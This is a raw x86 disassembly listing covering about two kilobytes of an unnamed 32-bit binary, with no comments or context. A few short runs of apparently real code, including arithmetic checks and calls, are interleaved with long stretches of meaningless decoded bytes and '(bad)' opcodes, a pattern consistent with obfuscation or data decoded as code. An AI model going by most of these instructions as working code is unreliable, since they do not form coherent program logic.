  419df1:	xchg   esp,eax
  419df2:	pop    edi
  419df3:	ror    BYTE PTR [eax+0x28],cl
  419df6:	sbb    DWORD PTR [edx+0x3737bde0],0xaa353258
  419e00:	cld    
  419e01:	retf   
  419e02:	or     eax,0x8b6682b6
  419e07:	push   esp
  419e08:	and    al,0x24
  419e0a:	xor    cx,dx
  419e0d:	mov    dx,WORD PTR [esp+0x2c]
  419e12:	imul   cx,dx
  419e16:	mov    dx,WORD PTR [esp+0x38]
  419e1b:	and    cx,dx
  419e1e:	mov    edx,0x694c
  419e23:	and    cx,dx
  419e26:	mov    dx,WORD PTR [esp+0x3c]
  419e2b:	cmp    dx,cx
  419e2e:	ja     0x41a320
  419e34:	mov    ecx,DWORD PTR [esp+0x18]
  419e38:	mov    edx,DWORD PTR [esp+0x1c]
  419e3c:	jmp    0x41a099
  419e41:	add    edi,DWORD PTR [edx-0x6d83ed16]
  419e47:	cmp    al,0xbc
  419e49:	loopne 0x419e57
  419e4b:	inc    edx
  419e4c:	fst    QWORD PTR [edi+0x50]
  419e4f:	adc    bl,BYTE PTR [esi-0x413fe8ed]
  419e55:	xor    eax,0xf0bebec2
  419e5a:	xor    bl,BYTE PTR [eax]
  419e5c:	mov    ebp,DWORD PTR [eax-0x1955287f]
  419e62:	xchg   edx,eax
  419e63:	pop    ebx
  419e64:	add    ecx,ebx
  419e66:	sub    ah,BYTE PTR [edi-0xf]
  419e69:	rcr    dl,cl
  419e6b:	mov    dh,0x44
  419e6d:	cmp    DWORD PTR [eax+edx*8+0x15176aba],0x1b
  419e75:	add    edx,DWORD PTR [ecx+0x6eb5e905]
  419e7b:	scas   eax,DWORD PTR es:[edi]
  419e7c:	sub    cl,BYTE PTR [edi+0x17]
  419e7f:	xchg   esi,eax
  419e80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e81:	jmp    0x542f:0xc49330bc
  419e88:	cld    
  419e89:	rcl    DWORD PTR [eax],cl
  419e8b:	cwde   
  419e8c:	adc    BYTE PTR [ecx],ch
  419e8e:	ja     0x419e42
  419e90:	or     ah,BYTE PTR [ebx]
  419e92:	push   ecx
  419e93:	outs   dx,BYTE PTR ds:[esi]
  419e94:	mov    esi,0xbdf890d9
  419e99:	jno    0x419e49
  419e9b:	es pushf 
  419e9d:	cld    
  419e9e:	sbb    DWORD PTR [esi+0x5c],edi
  419ea1:	sbb    eax,0xd07ffb19
  419ea6:	fcomp  QWORD PTR [ebp+0x4c]
  419ea9:	push   ecx
  419eaa:	pop    ebx
  419eab:	sub    edx,esi
  419ead:	and    eax,0xc8200dc4
  419eb2:	mov    ebp,DWORD PTR [eax]
  419eb4:	fs dec esp
  419eb6:	pop    edx
  419eb7:	pushf  
  419eb8:	add    ebp,DWORD PTR [ecx-0x75f9c4a1]
  419ebe:	mov    DWORD PTR [esi+ebx*4+0x1b],ebp
  419ec2:	mov    al,0xb6
  419ec4:	mov    gs,WORD PTR [ebx]
  419ec6:	daa    
  419ec7:	xchg   ebx,esp
  419ec9:	ficom  WORD PTR [ebp+0x6e]
  419ecc:	fiadd  DWORD PTR [ebp+0x55cf0b15]
  419ed2:	cmp    edx,ecx
  419ed4:	push   es
  419ed5:	jecxz  0x419f25
  419ed7:	fadd   QWORD PTR [edx+0x15ac5963]
  419edd:	and    DWORD PTR [ebx+0x49],0xffffffc3
  419ee1:	and    DWORD PTR [esi+0x1610e278],0xffffff8d
  419ee8:	inc    ebx
  419ee9:	xchg   ebx,eax
  419eea:	mov    dl,0xd
  419eec:	ret    0x43ea
  419eef:	and    BYTE PTR [edi-0x1f3a68d9],dh
  419ef5:	jnp    0x419eb0
  419ef7:	jg     0x419ef9
  419ef9:	inc    ebp
  419efa:	push   esp
  419efb:	sbb    BYTE PTR ds:0x4b7b66fd,ch
  419f01:	inc    ecx
  419f02:	push   esi
  419f03:	sub    cl,ch
  419f05:	shl    DWORD PTR [ebp-0x3316189],cl
  419f0b:	fimul  DWORD PTR [esp+edx*8]
  419f0e:	push   eax
  419f0f:	cld    
  419f10:	push   ss
  419f11:	shl    DWORD PTR [esi+0x724eaa94],1
  419f17:	sub    bh,bh
  419f19:	mov    al,ds:0xa7f5c027
  419f1e:	mov    eax,ds:0x36db9bbc
  419f23:	mov    edi,0x5f24cc45
  419f28:	sar    DWORD PTR [ecx-0xe001a41],0x83
  419f2f:	ins    BYTE PTR es:[edi],dx
  419f30:	fsubr  st(3),st
  419f32:	mov    al,0x10
  419f34:	push   ss
  419f35:	mov    ds:0xce93387f,al
  419f3a:	(bad)  
  419f3b:	jp     0x419fb9
  419f3d:	ror    DWORD PTR [edx+0x5d],1
  419f40:	pop    esi
  419f41:	xchg   ecx,eax
  419f42:	sahf   
  419f43:	mov    eax,ds:0xa383a116
  419f48:	lock push ss
  419f4a:	mov    dh,0x85
  419f4c:	xchg   DWORD PTR [edi],ecx
  419f4e:	sub    edi,DWORD PTR [ebx]
  419f50:	(bad)  [ecx-0x24179d6a]
  419f56:	retf   
  419f57:	cld    
  419f58:	stos   DWORD PTR es:[edi],eax
  419f59:	enter  0x76a5,0x40
  419f5d:	shl    BYTE PTR [edx],cl
  419f5f:	shl    BYTE PTR es:[ebp-0x27],1
  419f63:	ds dec edx
  419f65:	pop    eax
  419f66:	jmp    0x438c0496
  419f6b:	repz out 0x80,al
  419f6e:	add    DWORD PTR [edi-0x47],ecx
  419f71:	sbb    al,0xb4
  419f73:	push   cs
  419f74:	ins    BYTE PTR es:[edi],dx
  419f75:	xchg   ebx,eax
  419f76:	sub    cl,cl
  419f78:	sub    ebx,DWORD PTR [ecx-0x6]
  419f7b:	push   eax
  419f7c:	imul   ch
  419f7e:	mov    cl,0xf6
  419f80:	push   cs
  419f81:	jmp    0x419f61
  419f83:	push   esp
  419f84:	outs   dx,DWORD PTR ds:[esi]
  419f85:	mov    ecx,0x6d40dab6
  419f8a:	jge    0x419f13
  419f8c:	cmp    dl,BYTE PTR [esi+0x26]
  419f8f:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  419f91:	lods   al,BYTE PTR ds:[esi]
  419f92:	aad    0x53
  419f94:	or     eax,esp
  419f96:	popa   
  419f97:	(bad)  
  419f99:	adc    al,bh
  419f9b:	dec    esp
  419f9c:	xchg   edx,eax
  419f9d:	lds    ebp,FWORD PTR ds:[edi]
  419fa0:	push   ebx
  419fa1:	and    DWORD PTR [ebx+0x66],ebp
  419fa4:	pop    ecx
  419fa5:	test   BYTE PTR [ebp-0x6fc03297],bh
  419fab:	pop    esp
  419fac:	push   ecx
  419fad:	cs (bad) 
  419faf:	das    
  419fb0:	jg     0x419f98
  419fb2:	test   DWORD PTR [ebx],eax
  419fb4:	out    dx,eax
  419fb5:	xchg   edi,eax
  419fb6:	push   edi
  419fb7:	dec    ebx
  419fb8:	jne    0x419fbd
  419fba:	iret   
  419fbb:	mov    al,ds:0xd3443659
  419fc0:	ja     0x419fcc
  419fc2:	out    dx,eax
  419fc3:	dec    esi
  419fc4:	les    edx,FWORD PTR [eax+esi*8]
  419fc7:	push   edx
  419fc8:	clc    
  419fc9:	fs add eax,ebx
  419fcc:	add    DWORD PTR [eax],edi
  419fce:	jmp    FWORD PTR [ecx+edi*8]
  419fd1:	push   ecx
  419fd2:	ss add dl,bh
  419fd5:	add    BYTE PTR [edx],ch
  419fd7:	push   edx
  419fd8:	ja     0x419fe5
  419fda:	sbb    eax,0x265e4af9
  419fdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fe0:	jg     0x419fae
  419fe2:	lds    edx,FWORD PTR [edi-0x33]
  419fe5:	inc    ecx
  419fe6:	jno    0x419fe0
  419fe8:	mov    ecx,0x52fad4e0
  419fed:	mov    ecx,0xcca19aee
  419ff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ff4:	push   esi
  419ff5:	mov    eax,0x388df196
  419ffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ffb:	outs   dx,BYTE PTR ds:[esi]
  419ffc:	xchg   ecx,eax
  419ffd:	dec    ecx
  419ffe:	sub    al,0xc1
  41a000:	imul   ebp,DWORD PTR [edx+edi*2+0x14087ac2],0xffffffbc
  41a008:	stos   BYTE PTR es:[edi],al
  41a009:	loope  0x41a07b
  41a00b:	jb     0x41a087
  41a00d:	or     bl,BYTE PTR [ebx+0x6e411e96]
  41a013:	jmp    0xc67728ab
  41a018:	pop    ss
  41a019:	sub    eax,DWORD PTR [eiz*8+0x63b8e7ba]
  41a020:	add    BYTE PTR [edx+0x73],0xbc
  41a024:	(bad)
  41a027:	xor    eax,0x90a406f9
  41a02c:	or     DWORD PTR [esi-0xf],0x346f858b
  41a033:	pop    ecx
  41a034:	jl     0x419fdd
  41a036:	pop    ds
  41a037:	sub    eax,0x9ca54a8a
  41a03c:	sub    DWORD PTR [ebx+0x1e],0x69
  41a040:	les    esp,FWORD PTR [edx]
  41a042:	(bad)  
  41a043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a044:	add    ecx,edx
  41a046:	loopne 0x41a00f
  41a048:	arpl   di,ax
  41a04a:	test   BYTE PTR [ebx],dh
  41a04c:	mul    DWORD PTR [eax]
  41a04e:	fnsave [esi]
  41a050:	xchg   esi,eax
  41a051:	clc    
  41a052:	mov    BYTE PTR [edi],ch
  41a054:	shl    BYTE PTR [edx],cl
  41a056:	outs   dx,DWORD PTR ds:[esi]
  41a057:	dec    ecx
  41a058:	cli    
  41a059:	jecxz  0x41a0a4
  41a05b:	or     ch,BYTE PTR [ebx+0x2e]
  41a05e:	aad    0x45
  41a060:	sbb    al,0xd9
  41a062:	repnz sub dh,BYTE PTR [esp+esi*1+0x7eeb0931]
  41a06a:	(bad)  
  41a06b:	mov    WORD PTR [eax+0x5d],es
  41a06e:	cmp    ch,dh
  41a070:	pop    eax
  41a071:	(bad)  
  41a074:	sbb    cl,BYTE PTR [eax+0x772e22c6]
  41a07a:	(bad)  
  41a07b:	into   
  41a07c:	inc    esp
  41a07d:	add    al,0xf3
  41a07f:	hlt    
  41a080:	sbb    bl,BYTE PTR [edi-0x2b]
  41a083:	imul   ebp,DWORD PTR ds:0xd81d831e,0xc
  41a08a:	mov    dh,0x52
  41a08c:	jmp    0x3a10:0xe5416d4e
  41a093:	mov    bh,0xe8
  41a095:	arpl   WORD PTR [ecx-0x53f0e24a],sp
  41a09b:	rol    DWORD PTR [edx],1
  41a09d:	xor    ecx,eax
  41a09f:	mov    eax,DWORD PTR [esp+0x18]
  41a0a3:	shr    edx,0x2
  41a0a6:	mov    edx,DWORD PTR [esp+0x1c]
  41a0aa:	xor    edx,edx
  41a0ac:	jmp    0x41a309
  41a0b1:	scas   ax,WORD PTR es:[edi]
  41a0b3:	xchg   ebx,eax
  41a0b4:	mov    dh,0x9c
  41a0b6:	mov    edx,0x94c4af6c
  41a0bb:	pop    esp
  41a0bc:	shl    esp,1
  41a0be:	mov    ecx,0x1b8b9092
  41a0c3:	sar    BYTE PTR [esi-0x41413dcb],0x40
  41a0ca:	xchg   DWORD PTR [edx+eax*8],ebx
  41a0cd:	jp     0x41a12e
  41a0cf:	dec    ebx
  41a0d0:	imul   ebx,DWORD PTR [eax-0x15],0xffffffa9
  41a0d4:	out    0x30,al
  41a0d6:	xor    eax,0xb0392075
  41a0db:	ss mov ch,0x5f
  41a0de:	and    al,0x98
  41a0e0:	bound  edx,QWORD PTR [ebp-0x1d24eb7c]
  41a0e6:	out    0x5c,eax
  41a0e8:	xor    dl,BYTE PTR [esi-0x21fcf40c]
  41a0ee:	sub    al,0xce
  41a0f0:	ret    
  41a0f1:	dec    ebp
  41a0f2:	add    al,0x13
  41a0f4:	mov    di,0x4992
  41a0f8:	int    0xb8
  41a0fa:	loope  0x41a16e
  41a0fc:	imul   ecx,DWORD PTR [ebx+0x7f821b38],0xffffffc4
  41a103:	test   DWORD PTR [esi-0x5c],edx
  41a106:	mov    eax,ds:0xb492ac28
  41a10b:	lea    edx,[edi+ebx*2]
  41a10e:	cmpxchg DWORD PTR [edi-0x277cd763],eax
  41a115:	xor    edx,DWORD PTR [edx+0x57]
  41a118:	je     0x41a12c
  41a11a:	rcl    DWORD PTR [ecx+0x68a02ee0],0x8
  41a121:	shl    BYTE PTR [ebx-0x6f],0x87
  41a125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a126:	psubb  mm3,mm0
  41a129:	repz add ebx,DWORD PTR [edx+0x23519608]
  41a130:	or     BYTE PTR [ecx],0xb0
  41a133:	sbb    eax,0x397e36d4
  41a138:	in     al,dx
  41a139:	ficom  DWORD PTR [edx]
  41a13b:	shr    ah,cl
  41a13d:	and    al,0x3a
  41a13f:	sbb    cl,BYTE PTR [esi-0x52357e2]
  41a145:	xchg   esi,eax
  41a146:	cmp    eax,0xeabf49a8
  41a14b:	push   ds
  41a14c:	ins    DWORD PTR es:[edi],dx
  41a14d:	mov    al,ds:0x1c8a60e3
  41a152:	jb     0x41a181
  41a154:	push   ebp
  41a155:	out    dx,eax
  41a156:	fisub  WORD PTR [eax-0x58d1e6df]
  41a15c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a15d:	bound  esi,QWORD PTR ds:0x22234979
  41a163:	push   edx
  41a164:	(bad)  
  41a165:	pop    edi
  41a166:	jle    0x41a194
  41a168:	rcl    BYTE PTR [edx],1
  41a16a:	add    eax,0x3
  41a16d:	retf   
  41a16e:	loop   0x41a136
  41a170:	pop    ecx
  41a171:	out    dx,al
  41a172:	mov    bh,ah
  41a174:	adc    eax,0x8d4a9d36
  41a179:	cli    
  41a17a:	imul   edi,DWORD PTR [esi-0x10f61d75],0xfae196d8
  41a184:	addr16 in eax,dx
  41a186:	inc    ebx
  41a187:	scas   eax,DWORD PTR es:[edi]
  41a188:	inc    eax
  41a189:	xor    edi,edx
  41a18b:	jl     0x41a1ad
  41a18d:	fnstsw WORD PTR [edi+0x38db6438]
  41a193:	adc    edx,DWORD PTR ds:0xca1b10e2
  41a199:	or     DWORD PTR [ebx],eax
  41a19b:	sub    al,0x4f
  41a19d:	xchg   edx,eax
  41a19e:	data16 enterw 0xae15,0x8c
  41a1a4:	or     bl,BYTE PTR [edi-0x3d7af3d3]
  41a1aa:	repnz push ds
  41a1ac:	(bad)  
  41a1ad:	mov    ebp,0xf8e122c5
  41a1b2:	jge    0x41a1df
  41a1b4:	outs   dx,DWORD PTR ds:[esi]
  41a1b5:	inc    esp
  41a1b6:	popf   
  41a1b7:	hlt    
  41a1b8:	stc    
  41a1b9:	dec    edi
  41a1ba:	and    dl,bl
  41a1bc:	out    0xbd,eax
  41a1be:	sbb    eax,0xe7e8f23c
  41a1c3:	inc    esi
  41a1c4:	shr    DWORD PTR [edx-0x39c52076],cl
  41a1ca:	pop    esp
  41a1cb:	fs mov ch,0xa0
  41a1ce:	fstp   QWORD PTR [edx-0x2ba3a302]
  41a1d4:	sub    al,0x96
  41a1d6:	adc    BYTE PTR [ecx-0x79],ch
  41a1d9:	jns    0x41a193
  41a1db:	imul   edi,ebp,0x7b70244a
  41a1e1:	push   es
  41a1e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1e3:	popa   
  41a1e4:	jns    0x41a1a2
  41a1e6:	mov    eax,ds:0xd1a31c12
  41a1eb:	push   eax
  41a1ec:	xchg   ebp,eax
  41a1ed:	fst    DWORD PTR [esi-0x6f]
  41a1f0:	ss xchg ebp,eax
  41a1f2:	mov    ds:0xdcfe918a,al
  41a1f7:	push   ss
  41a1f8:	xchg   edi,eax
  41a1f9:	mov    al,dl
  41a1fb:	push   0xbfb6e224
  41a200:	bound  edi,QWORD PTR [eax+0x15]
  41a203:	xor    al,0x62
  41a205:	fbstp  TBYTE PTR [ecx-0x25b19267]
  41a20b:	inc    ecx
  41a20c:	mov    bl,0xe4
  41a20e:	mov    eax,ds:0xe62ac643
  41a213:	hlt    
  41a214:	and    DWORD PTR ds:0xf948aa76,0xffffffe4
  41a21b:	out    0x3b,eax
  41a21d:	jno    0x41a1bb
  41a21f:	mov    ebx,0x174da413
  41a224:	(bad)  
  41a225:	cmp    DWORD PTR [eax],esi
  41a227:	push   eax
  41a228:	icebp  
  41a229:	fidivr WORD PTR [ebx-0x74]
  41a22c:	xchg   esi,eax
  41a22d:	push   edi
  41a22e:	xor    ecx,DWORD PTR [esi-0x6f]
  41a231:	pop    esi
  41a232:	mov    esi,0x844f7db3
  41a237:	cld    
  41a238:	add    BYTE PTR [ebx+edx*2-0x498edf3d],0x35
  41a240:	pusha  
  41a241:	aam    0x4
  41a243:	dec    ebp
  41a244:	cli    
  41a245:	js     0x41a266
  41a247:	jb     0x41a2a7
  41a249:	fs dec esp
  41a24b:	cmp    eax,0x834d5b64
  41a250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a251:	mov    ebx,0x58eb9a8b
  41a256:	lock mov bh,0x8d
  41a259:	aas    
  41a25a:	cmp    DWORD PTR [edx-0x49],0xffffff86
  41a25e:	out    0x4c,al
  41a260:	inc    esp
  41a261:	arpl   WORD PTR [edi+0x69d20f8b],dx
  41a267:	sbb    al,0x8d
  41a269:	or     al,ah
  41a26b:	xchg   DWORD PTR [edx+eax*2],esp
  41a26e:	pop    ebx
  41a26f:	mov    esi,0x2b4efd71
  41a274:	sub    BYTE PTR [ecx],bh
  41a276:	into   
  41a277:	or     eax,0xcf09170c
  41a27c:	fwait
  41a27d:	dec    ebx
  41a27e:	sar    cl,cl
  41a280:	out    dx,eax
  41a281:	xor    al,BYTE PTR [ecx]
  41a283:	fdiv   DWORD PTR [ebp+0x1f]
  41a286:	add    DWORD PTR [ebx+ecx*4],esi
  41a289:	ds fucomip st,st(2)
  41a28c:	gs cli 
  41a28e:	loope  0x41a2af
  41a290:	nop    DWORD PTR [edi-0x72]
  41a294:	pop    ds
  41a295:	(bad)  [eax+0x2085ee9c]
  41a29b:	cs jge 0x41a310
  41a29e:	jbe    0x41a300
  41a2a0:	jnp    0x41a2ef
  41a2a2:	mov    ebx,0x6010c7cd
  41a2a7:	(bad)  
  41a2a9:	bound  edi,QWORD PTR [eax-0x2a]
  41a2ac:	(bad)  
  41a2ad:	sbb    DWORD PTR [esi-0x6bdeb9d6],ebx
  41a2b3:	aad    0x43
  41a2b5:	sar    ch,cl
  41a2b7:	cmc    
  41a2b8:	das    
  41a2b9:	es loop 0x41a337
  41a2bc:	jmp    0x4aa9440
  41a2c1:	xchg   esp,edi
  41a2c3:	inc    esi
  41a2c4:	xor    bl,BYTE PTR [ebp-0x68]
  41a2c7:	pop    esi
  41a2c8:	pop    edx
  41a2c9:	nop
  41a2ca:	mov    dl,0x25
  41a2cc:	ins    DWORD PTR es:[edi],dx
  41a2cd:	mov    dl,0x6a
  41a2cf:	mov    ecx,0x575e7352
  41a2d4:	sahf   
  41a2d5:	sub    DWORD PTR [esi+0x43],ebx
  41a2d8:	mov    ebp,0xc2e9974
  41a2dd:	inc    ecx
  41a2de:	xchg   edx,eax
  41a2df:	or     BYTE PTR [eax-0x3f],dl
  41a2e2:	fdecstp 
  41a2e4:	jo     0x41a2af
  41a2e6:	mov    eax,ds:0x6103f84b
  41a2eb:	xchg   esp,eax
  41a2ec:	inc    esi
  41a2ed:	inc    ecx
  41a2ee:	jmp    0x716a0470
  41a2f3:	add    eax,0x27a0931d
  41a2f8:	icebp  
  41a2f9:	jae    0x41a2d0
  41a2fb:	ret    0xe9b4
  41a2fe:	mov    al,0xee
  41a300:	dec    ecx
  41a301:	adc    edx,DWORD PTR [ebp+eiz*8+0x5da0ff33]
  41a308:	pop    ebx
  41a309:	or     edx,ecx
  41a30b:	push   edx
  41a30c:	push   esi
  41a30d:	shl    eax,0x1e
  41a310:	push   edi
  41a311:	lea    eax,[esp+0x7c]
  41a315:	push   eax
  41a316:	lea    eax,[esp+0x28]
  41a31a:	push   eax
  41a31b:	call   0x411472
  41a320:	push   DWORD PTR [esp+0x74]
  41a324:	push   DWORD PTR [esp+0x74]
  41a328:	push   DWORD PTR [esp+0x24]
  41a32c:	push   DWORD PTR [esp+0x24]
  41a330:	call   0x412349
  41a335:	mov    edx,DWORD PTR [esp+0x18]
  41a339:	mov    eax,DWORD PTR [esp+0x1c]
  41a33d:	mov    ecx,DWORD PTR [esp+0x18]
  41a341:	mov    edi,DWORD PTR [esp+0x1c]
  41a345:	shrd   edx,eax,0x2
  41a349:	shr    eax,0x2
  41a34c:	shl    ecx,0x1e
  41a34f:	xor    ecx,ecx
  41a351:	mov    eax,0x32de6d5d
  41a356:	xor    edx,eax
  41a358:	or     ecx,edx
  41a35a:	mov    edx,DWORD PTR [esp+0x5c]
  41a35e:	mov    DWORD PTR [edx],ecx
  41a360:	mov    ecx,DWORD PTR [esp+0x18]
  41a364:	jmp    0x41a5c1
  41a369:	repz sub cl,0x71
  41a36d:	mov    edx,0x20807cbb
  41a372:	shl    al,cl
  41a374:	iret   
  41a375:	push   esi
  41a376:	js     0x41a31c
  41a378:	nop
  41a379:	add    al,0x1f
  41a37b:	sar    BYTE PTR [esi-0x41413dcb],0xf8
  41a382:	mov    ss,WORD PTR [eax-0x3e]
  41a385:	icebp  
  41a386:	xor    BYTE PTR [ecx-0x91c4449],al
  41a38c:	(bad)  [eax]
  41a38e:	bnd jg 0x41a36c
  41a391:	mov    eax,0x23e00a8b
  41a396:	ss mov bl,0x15
  41a399:	xchg   ebx,eax
  41a39a:	shl    BYTE PTR [edi],1
  41a39c:	cdq    
  41a39d:	call   0x70ce:0x8da336e0
  41a3a4:	lds    esi,FWORD PTR [esi+0x788201a5]
  41a3aa:	js     0x41a41c
  41a3ac:	cmp    DWORD PTR [eax+0x296ed58b],edi
  41a3b2:	sub    eax,0x2125b5e4
  41a3b7:	mov    DWORD PTR [edx+0x3b],esp
  41a3ba:	fiadd  DWORD PTR [eax+0x69]
  41a3bd:	aad    0xd3
  41a3bf:	sbb    cl,BYTE PTR ds:0x34168762
  41a3c5:	sub    al,0xe5
  41a3c7:	adc    BYTE PTR [ebx-0x5bfd5e38],dh
  41a3cd:	mov    al,ds:0xb96bc0
  41a3d2:	retf   0xded1
  41a3d5:	aam    0x7c
  41a3d7:	add    al,0xa5
  41a3d9:	out    dx,eax
  41a3da:	or     al,0x8f
  41a3dc:	add    edi,DWORD PTR ds:0x9961693c
  41a3e2:	stos   DWORD PTR es:[edi],eax
  41a3e3:	pop    ebp
  41a3e4:	mov    bh,0xbe
  41a3e6:	out    dx,al
  41a3e7:	inc    edx
  41a3e8:	mov    ebp,0x32513e10
  41a3ed:	sahf   
  41a3ee:	adc    BYTE PTR [edi+0xa],0x6d
  41a3f2:	pop    eax
  41a3f3:	imul   ebx,DWORD PTR [ebp+0x57],0x78
  41a3f7:	mov    ebx,0x7ac05d55
  41a3fc:	call   0x4cfe4713
  41a401:	(bad)
  41a404:	jg     0x41a3ab
  41a406:	mov    ds,WORD PTR [edx+0x43]
  41a409:	jecxz  0x41a414
  41a40b:	jne    0x41a3e4
  41a40d:	popa   
  41a40e:	stos   DWORD PTR es:[edi],eax
  41a40f:	je     0x41a3b8
  41a411:	ins    BYTE PTR es:[edi],dx
  41a412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a413:	and    BYTE PTR [edx-0x42bcf663],bh
  41a419:	je     0x41a3de
  41a41b:	push   es
  41a41c:	hlt    
  41a41d:	mov    esi,DWORD PTR [ebx]
  41a41f:	stc    
  41a420:	push   0xea9f4262
  41a425:	pop    esp
  41a426:	ins    DWORD PTR es:[edi],dx
  41a427:	xor    dl,BYTE PTR fs:[ebp-0x95292e2]
  41a42e:	mov    al,0x71
  41a430:	xor    al,0x98
  41a432:	or     al,dl
  41a434:	mov    dh,0x7a
  41a436:	add    cl,BYTE PTR [eax+eax*8-0x21]
  41a43a:	dec    ebx
  41a43b:	pop    ebp
  41a43c:	les    edx,FWORD PTR [eax]
  41a43e:	lock adc cl,ch
  41a441:	inc    edi
  41a442:	mov    esp,esi
  41a444:	pop    ebp
  41a445:	sbb    al,0x6e
  41a447:	je     0x41a45d
  41a449:	fnstsw WORD PTR [ecx-0x6a]
  41a44c:	xchg   DWORD PTR cs:[esi+0x4a],esp
  41a450:	shl    eax,1
  41a452:	imul   esp,DWORD PTR [eax],0x6d
  41a455:	shl    DWORD PTR [ecx-0xd],cl
  41a458:	(bad)  
  41a459:	shl    BYTE PTR [edi-0x34],0xfd
  41a45d:	ret    
  41a45e:	jbe    0x41a461
  41a460:	xchg   ebx,eax
  41a461:	push   ebx
  41a462:	repz pop edx
  41a464:	push   ss
  41a465:	cmp    DWORD PTR [ecx-0xc401924],eax
  41a46b:	cmp    al,0x16
  41a46d:	dec    eax
  41a46e:	inc    eax
  41a46f:	loopne 0x41a4d4
  41a471:	jp     0x41a452
  41a473:	ret    0xfc72
  41a476:	and    DWORD PTR [edx+esi*8-0x1d],esp
  41a47a:	push   ds
  41a47b:	push   cs
  41a47c:	mov    dh,0x71
  41a47e:	leave  
  41a47f:	inc    esi
  41a480:	jo     0x41a47a
  41a482:	ret    0xf7b9
  41a485:	mov    es,WORD PTR [ebx+0xe]
  41a488:	cmp    ch,BYTE PTR [esi+0x34]
  41a48b:	into   
  41a48c:	push   esi
  41a48d:	cmp    bh,BYTE PTR [esi-0x56]
  41a490:	cdq    
  41a491:	call   0x413e9866
  41a496:	adc    eax,0x641a242a
  41a49b:	dec    eax
  41a49c:	ror    cl,1
  41a49e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a49f:	fs pop edi
  41a4a1:	cmp    BYTE PTR [edx+ebp*2],al
  41a4a4:	dec    esi
  41a4a5:	data16 inc BYTE PTR [edi+0x26]
  41a4a9:	ret    0xb9b2
  41a4ac:	pop    eax
  41a4ad:	fs js  0x41a4b7
  41a4b0:	pop    ecx
  41a4b1:	lock jmp 0x41a4fd
  41a4b4:	mov    edi,DWORD PTR [ecx+eax*2]
  41a4b7:	inc    edx
  41a4b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4b9:	pop    ss
  41a4ba:	ja     0x41a460
  41a4bc:	cmp    BYTE PTR [esi],bh
  41a4be:	(bad)  
  41a4bf:	cwde   
  41a4c0:	jge    0x41a53c
  41a4c2:	hlt    
  41a4c3:	inc    ecx
  41a4c4:	cwde   
  41a4c5:	jmp    0x41a51e
  41a4c7:	test   BYTE PTR [ebx-0x6b],dh
  41a4ca:	cli    
  41a4cb:	ins    BYTE PTR es:[edi],dx
  41a4cc:	in     al,dx
  41a4cd:	into   
  41a4ce:	xchg   esi,eax
  41a4cf:	inc    ecx
  41a4d0:	xchg   ebp,eax
  41a4d1:	jmp    0xf723:0xf1250ed3
  41a4d8:	inc    DWORD PTR [edi+esi*8-0x52f50f74]
  41a4df:	and    bh,dh
  41a4e1:	and    bl,bh
  41a4e3:	cmp    al,0x85
  41a4e5:	mov    ah,0xef
  41a4e7:	out    0xfd,al
  41a4e9:	(bad)  
  41a4ea:	shr    BYTE PTR [ebx+0x15],0xaf
  41a4ee:	(bad)  
  41a4ef:	cli    
  41a4f0:	shl    BYTE PTR [edx+0x77],1
  41a4f3:	stc    
  41a4f4:	aam    0x5b
  41a4f6:	sub    edi,DWORD PTR [edi-0x7a]
  41a4f9:	xchg   edx,eax
  41a4fa:	adc    DWORD PTR [ebx],ecx
  41a4fc:	in     al,dx
  41a4fd:	mov    ebp,0x1ea47e09
  41a502:	mov    ah,0x2c
  41a504:	ins    DWORD PTR es:[edi],dx
  41a505:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a506:	or     esp,ebx
  41a508:	fst    st(2)
  41a50a:	sub    ebx,DWORD PTR [edi+0x6f]
  41a50d:	xchg   esp,eax
  41a50e:	jmp    0x41a4b6
  41a510:	and    al,0x75
  41a512:	leave  
  41a513:	sub    BYTE PTR [edi+0x454f867],dh
  41a519:	jns    0x41a557
  41a51b:	push   esp
  41a51c:	out    dx,eax
  41a51d:	add    DWORD PTR [esi+0x69cab4],0x5d
  41a524:	pop    edx
  41a525:	clc    
  41a526:	xor    DWORD PTR [edx],ecx
  41a528:	imul   esp,DWORD PTR [ebx+0x5a],0x3d994ee0
  41a52f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a530:	stos   DWORD PTR es:[edi],eax
  41a531:	inc    ebp
  41a532:	jnp    0x41a56b
  41a534:	and    al,0xb7
  41a536:	mov    ds:0xa458bc72,eax
  41a53b:	rcl    DWORD PTR [ebp+0xe55a5da],cl
  41a541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a542:	in     al,0x85
  41a544:	jmp    0x41a5ad
  41a546:	nop
  41a547:	fmul   st(7),st
  41a549:	dec    ebp
  41a54a:	adc    al,0xed
  41a54c:	xor    ch,BYTE PTR [ebx-0x73]
  41a54f:	adc    edx,DWORD PTR [eax]
  41a551:	es xchg esp,eax
  41a553:	jge    0x41a58e
  41a555:	mov    ebp,0x881d9178
  41a55a:	and    dl,BYTE PTR gs:0x1447d50f
  41a561:	ins    DWORD PTR es:[edi],dx
  41a562:	mov    dl,0x52
  41a564:	fbld   TBYTE PTR [edx]
  41a566:	push   esi
  41a567:	cli    
  41a568:	xor    al,cl
  41a56a:	xchg   BYTE PTR [ecx],al
  41a56c:	mov    dl,0x48
  41a56e:	out    dx,eax
  41a56f:	or     al,0xa8
  41a571:	inc    esp
  41a572:	or     al,0x50
  41a574:	xlat   BYTE PTR ds:[ebx]
  41a575:	and    edi,DWORD PTR [edx+0x49]
  41a578:	push   ds
  41a579:	fdiv   QWORD PTR [esi-0x63d4be87]
  41a57f:	or     BYTE PTR [esp+esi*2-0x6],0x2
